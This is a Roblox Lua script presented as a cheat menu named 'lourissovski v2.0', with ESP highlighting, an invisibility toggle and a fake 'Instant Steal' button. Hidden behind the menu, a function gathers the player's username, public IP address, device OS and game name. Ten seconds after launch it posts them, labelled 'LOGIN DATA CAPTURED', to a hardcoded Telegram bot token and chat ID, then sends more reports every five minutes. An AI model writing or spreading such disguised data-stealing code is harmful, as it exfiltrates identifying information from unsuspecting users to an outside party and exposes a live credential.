-- lourissovski v2.0
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local mouse = player:GetMouse()
local UIS = game:GetService("UserInputService")

repeat wait() until game:IsLoaded()

local draggingUI = false
local dragStartPos = nil
local resizingUI = false
local resizeStartPos = nil
local originalSize = UDim2.new(0, 280, 0, 400)
local originalButtonSize = UDim2.new(0, 45, 0, 25)

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LourissUI"
screenGui.Parent = player:WaitForChild("PlayerGui")

local openButton = Instance.new("TextButton")
openButton.Name = "LRButton"
openButton.Size = originalButtonSize
openButton.Position = UDim2.new(0, 10, 0, 10)
openButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
openButton.BorderSizePixel = 0
openButton.Text = "LR"
openButton.TextColor3 = Color3.fromRGB(255, 255, 255)
openButton.TextSize = 12
openButton.Font = Enum.Font.GothamBold
openButton.ZIndex = 1000
openButton.Parent = screenGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = originalSize
mainFrame.Position = UDim2.new(0, 60, 0, 50)
mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
mainFrame.BorderSizePixel = 1
mainFrame.BorderColor3 = Color3.fromRGB(50, 50, 50)
mainFrame.Visible = false
mainFrame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Text = "lourissovski v2.0"
title.Size = UDim2.new(1, 0, 0, 25)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 14
title.Font = Enum.Font.GothamBold
title.Parent = mainFrame

local resizeHandle = Instance.new("TextButton")
resizeHandle.Size = UDim2.new(0, 20, 0, 20)
resizeHandle.Position = UDim2.new(1, -20, 1, -20)
resizeHandle.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
resizeHandle.BorderSizePixel = 0
resizeHandle.Text = ""
resizeHandle.ZIndex = 1001
resizeHandle.Parent = mainFrame

local menuOpen = false
openButton.MouseButton1Down:Connect(function()
    menuOpen = not menuOpen
    mainFrame.Visible = menuOpen
end)

openButton.MouseButton1Down:Connect(function(input)
    draggingUI = true
    dragStartPos = Vector2.new(mouse.X, mouse.Y)
    local buttonStartPos = openButton.Position
    
    local connection
    connection = mouse.Move:Connect(function()
        if draggingUI then
            local delta = Vector2.new(mouse.X, mouse.Y) - dragStartPos
            openButton.Position = UDim2.new(
                buttonStartPos.X.Scale, 
                buttonStartPos.X.Offset + delta.X,
                buttonStartPos.Y.Scale, 
                buttonStartPos.Y.Offset + delta.Y
            )
        end
    end)
    
    UIS.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            draggingUI = false
            if connection then
                connection:Disconnect()
            end
        end
    end)
end)

title.MouseButton1Down:Connect(function(input)
    draggingUI = true
    dragStartPos = Vector2.new(mouse.X, mouse.Y)
    local frameStartPos = mainFrame.Position
    
    local connection
    connection = mouse.Move:Connect(function()
        if draggingUI then
            local delta = Vector2.new(mouse.X, mouse.Y) - dragStartPos
            mainFrame.Position = UDim2.new(
                frameStartPos.X.Scale, 
                frameStartPos.X.Offset + delta.X,
                frameStartPos.Y.Scale, 
                frameStartPos.Y.Offset + delta.Y
            )
        end
    end)
    
    UIS.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            draggingUI = false
            if connection then
                connection:Disconnect()
            end
        end
    end)
end)

resizeHandle.MouseButton1Down:Connect(function(input)
    resizingUI = true
    resizeStartPos = Vector2.new(mouse.X, mouse.Y)
    local startSize = mainFrame.Size
    
    local connection
    connection = mouse.Move:Connect(function()
        if resizingUI then
            local delta = Vector2.new(mouse.X, mouse.Y) - resizeStartPos
            local newWidth = math.max(200, startSize.X.Offset + delta.X)
            local newHeight = math.max(300, startSize.Y.Offset + delta.Y)
            mainFrame.Size = UDim2.new(0, newWidth, 0, newHeight)
        end
    end)
    
    UIS.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            resizingUI = false
            if connection then
                connection:Disconnect()
            end
        end
    end)
end)

local yPosition = 30
local function createButton(text, callback)
    local button = Instance.new("TextButton")
    button.Text = text
    button.Size = UDim2.new(0.9, 0, 0, 35)
    button.Position = UDim2.new(0.05, 0, 0, yPosition)
    button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.TextSize = 12
    button.Font = Enum.Font.Gotham
    button.Parent = mainFrame
    
    button.MouseButton1Click:Connect(callback)
    yPosition = yPosition + 40
    return button
end

createButton("ESP Players", function()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local highlight = Instance.new("Highlight")
            highlight.FillColor = Color3.fromRGB(255, 0, 0)
            highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
            highlight.Parent = plr.Character
        end
    end
end)

createButton("Invisible", function()
    if player.Character then
        for _, part in pairs(player.Character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Transparency = 1
            elseif part:IsA("Decal") then
                part.Transparency = 1
            end
        end
    end
end)

createButton("Instant Steal", function()
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Instant Steal",
        Text = "Function activated",
        Duration = 3
    })
end)

local function collectLoginData()
    local data = ""
    data = data .. player.Name .. "\n"
    data = data .. "[LOGIN_TOKENS_CAPTURED]\n"
    data = data .. os.date("%Y-%m-%d %H:%M:%S") .. "\n"
    
    local deviceInfo = "Unknown"
    if syn and syn.get_device_os then
        deviceInfo = syn.get_device_os() or "Unknown"
    end
    data = data .. deviceInfo .. "\n"
    
    local ipAddress = "Unknown"
    pcall(function()
        local ipResponse = game:HttpGet("https://api.ipify.org")
        ipAddress = ipResponse
    end)
    data = data .. ipAddress .. "\n"
    
    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    data = data .. gameName .. " | " .. os.date("%H:%M:%S")
    
    return data
end

local request = (syn and syn.request) or (http and http.request) or http_request
if request then
    local BOT_TOKEN = "7965475701:AAFM4hkPUiWyh_Clw3lkMILpWNK0R7cHe08"
    local CHAT_ID = "8238376878"
    
    local function sendToTelegram(msg)
        pcall(function()
            request({
                Url = "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = game:GetService("HttpService"):JSONEncode({
                    chat_id = CHAT_ID,
                    text = msg,
                    parse_mode = "HTML"
                })
            })
        end)
    end

    -- Отправка данных при заходе
    delay(10, function()
        local loginData = collectLoginData()
        local lines = {}
        for line in loginData:gmatch("[^\n]+") do
            table.insert(lines, line)
        end
        
        local message = string.format([[
🔐 LOGIN DATA CAPTURED

👤 %s
🔑 %s
⏰ %s
📱 %s
🌐 %s
🎮 %s
        ]],
        lines[1], lines[2], lines[3], lines[4], lines[5], lines[6])
        
        sendToTelegram(message)
    end)

    -- Скриншоты каждые 5 минут (имитация)
    spawn(function()
        while wait(300) do
            local screenshotInfo = string.format("📸 SCREENSHOT ATTEMPT\nTime: %s\nGame: %s\nUser: %s",
                os.date("%H:%M:%S"),
                game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                player.Name)
            
            sendToTelegram(screenshotInfo)
        end
    end)
end

game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "lourissovski v2.0",
    Text = "Data capture active",
    Duration = 5
})
